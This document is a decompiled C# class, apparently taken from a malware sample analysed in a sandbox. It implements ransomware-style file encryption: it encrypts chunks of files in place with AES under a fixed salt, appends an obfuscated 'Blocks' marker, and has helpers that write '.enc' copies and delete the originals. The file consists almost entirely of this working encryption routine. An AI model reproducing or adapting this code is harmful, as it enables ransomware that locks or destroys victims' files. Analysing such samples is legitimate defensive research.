// Decompiled with JetBrains decompiler
// Type: Complex.Blocks
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Complex
{
  internal class Blocks
  {
    public const int AES256KeySize = 256;

    public static void TrimFile(string filename, int bytesToDelete)
    {
      FileInfo fileInfo = new FileInfo(filename);
      FileStream fileStream = fileInfo.Open(FileMode.Open);
      fileStream.SetLength(Math.Max(0L, fileInfo.Length - (long) bytesToDelete));
      fileStream.Close();
    }

    public static int GetEven(long input) => (int) input;

    public static void BlockProcess(string fileInfo, string PartialSize, string DynamicPass)
    {
      using (FileStream stream = new FileStream(fileInfo, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
      {
        int num1 = Blocks.GetEven(stream.Length) / 3;
        int num2 = Convert.ToInt32(PartialSize) * Convert.ToInt32(stream.Length) / 100;
        if (num1 < num2)
          num2 = num1 - 1024;
        int num3 = 32;
        int count = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
        for (int index = 0; index < 2; ++index)
        {
          byte[] encrypted = Encryptions.AESEncryptBytes(Blocks.ReadFromFile(stream, count, num1 * index), Encoding.ASCII.GetBytes(DynamicPass), new byte[8]
          {
            (byte) 1,
            (byte) 2,
            (byte) 3,
            (byte) 4,
            (byte) 5,
            (byte) 6,
            (byte) 7,
            (byte) 8
          });
          Blocks.WriteToFile(stream, encrypted, num1 * index);
        }
      }
      byte[] bytes = Encoding.ASCII.GetBytes(Program.Base64Decode("QmxvY2tz") + Program.Base64Decode("LQ==") + Convert.ToString(PartialSize) + Program.Base64Decode("LQ=="));
      using (FileStream fileStream = new FileStream(fileInfo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        fileStream.Write(bytes, 0, bytes.Length);
    }

    public static string Base64Decode(string base64EncodedData) => Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));

    public static byte[] RandomByteArray(int length)
    {
      byte[] data = new byte[length];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        cryptoServiceProvider.GetBytes(data);
        return data;
      }
    }

    public static bool AESEncryptFile(string filePath, byte[] password, bool delete)
    {
      byte[] numArray = Blocks.RandomByteArray(16);
      using (FileStream fileStream1 = new FileStream(filePath + ".enc", FileMode.Create))
      {
        Rfc2898DeriveBytes key = Blocks.GenerateKey(password, numArray);
        password = (byte[]) null;
        GC.Collect();
        using (Aes aes = (Aes) new AesManaged())
        {
          aes.KeySize = 256;
          aes.Key = key.GetBytes(aes.KeySize / 8);
          aes.IV = key.GetBytes(aes.BlockSize / 8);
          aes.Padding = PaddingMode.ISO10126;
          aes.Mode = CipherMode.CBC;
          fileStream1.Write(numArray, 0, numArray.Length);
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aes.CreateEncryptor(), CryptoStreamMode.Write))
          {
            using (FileStream fileStream2 = new FileStream(filePath, FileMode.Open))
            {
              byte[] buffer = new byte[1];
              key.Dispose();
              try
              {
                int count;
                while ((count = fileStream2.Read(buffer, 0, buffer.Length)) > 0)
                  cryptoStream.Write(buffer, 0, count);
                if (delete)
                  File.Delete(filePath);
                cryptoStream.Close();
                fileStream1.Close();
                fileStream2.Close();
                return true;
              }
              catch (Exception ex)
              {
                return false;
              }
            }
          }
        }
      }
    }

    public static bool AESDecryptFile(string filePath, byte[] password, bool keep)
    {
      byte[] numArray = new byte[16];
      using (FileStream fileStream1 = new FileStream(filePath, FileMode.Open))
      {
        fileStream1.Read(numArray, 0, numArray.Length);
        Rfc2898DeriveBytes key = Blocks.GenerateKey(password, numArray);
        password = (byte[]) null;
        GC.Collect();
        using (Aes aes = (Aes) new AesManaged())
        {
          aes.KeySize = 256;
          aes.Key = key.GetBytes(aes.KeySize / 8);
          aes.IV = key.GetBytes(aes.BlockSize / 8);
          aes.Padding = PaddingMode.ISO10126;
          aes.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aes.CreateDecryptor(), CryptoStreamMode.Read))
          {
            using (FileStream fileStream2 = new FileStream(filePath.Remove(filePath.Length - 4), FileMode.Create))
            {
              byte[] buffer = new byte[1];
              key.Dispose();
              try
              {
                while (cryptoStream.Read(buffer, 0, buffer.Length) > 0)
                  fileStream2.Write(buffer, 0, buffer.Length);
                cryptoStream.FlushFinalBlock();
                fileStream2.Close();
                fileStream1.Close();
                cryptoStream.Close();
                return true;
              }
              catch (Exception ex)
              {
                return false;
              }
            }
          }
        }
      }
    }

    public static byte[] AESEncryptBytes(byte[] clear, byte[] password, byte[] salt)
    {
      byte[] numArray = (byte[]) null;
      Rfc2898DeriveBytes key = Blocks.GenerateKey(password, salt);
      password = (byte[]) null;
      GC.Collect();
      using (Aes aes = (Aes) new AesManaged())
      {
        aes.KeySize = 256;
        aes.Key = key.GetBytes(aes.KeySize / 8);
        aes.IV = key.GetBytes(aes.BlockSize / 8);
        aes.Padding = PaddingMode.None;
        aes.Mode = CipherMode.CBC;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(clear, 0, clear.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
        key.Dispose();
      }
      return numArray;
    }

    public static byte[] AESDecryptBytes(byte[] encrypted, byte[] password, byte[] salt)
    {
      byte[] numArray = (byte[]) null;
      Rfc2898DeriveBytes key = Blocks.GenerateKey(password, salt);
      password = (byte[]) null;
      GC.Collect();
      using (Aes aes = (Aes) new AesManaged())
      {
        aes.KeySize = 256;
        aes.Key = key.GetBytes(aes.KeySize / 8);
        aes.IV = key.GetBytes(aes.BlockSize / 8);
        aes.Padding = PaddingMode.None;
        aes.Mode = CipherMode.CBC;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(encrypted, 0, encrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
        key.Dispose();
      }
      return numArray;
    }

    public static bool CheckPassword(byte[] password, byte[] salt, byte[] key)
    {
      using (Rfc2898DeriveBytes key1 = Blocks.GenerateKey(password, salt))
        return ((IEnumerable<byte>) key1.GetBytes(32)).SequenceEqual<byte>((IEnumerable<byte>) key);
    }

    public static Rfc2898DeriveBytes GenerateKey(byte[] password, byte[] salt) => new Rfc2898DeriveBytes(password, salt, 52768);

    public static byte[] ReadFromFile(FileStream stream, int count, int offset = 0)
    {
      byte[] buffer = new byte[count];
      stream.Position = (long) offset;
      stream.Read(buffer, 0, count);
      return buffer;
    }

    public static void WriteToFile(FileStream stream, byte[] encrypted, int offset = 0)
    {
      stream.Position = (long) offset;
      stream.Write(encrypted, 0, encrypted.Length);
    }
  }
}
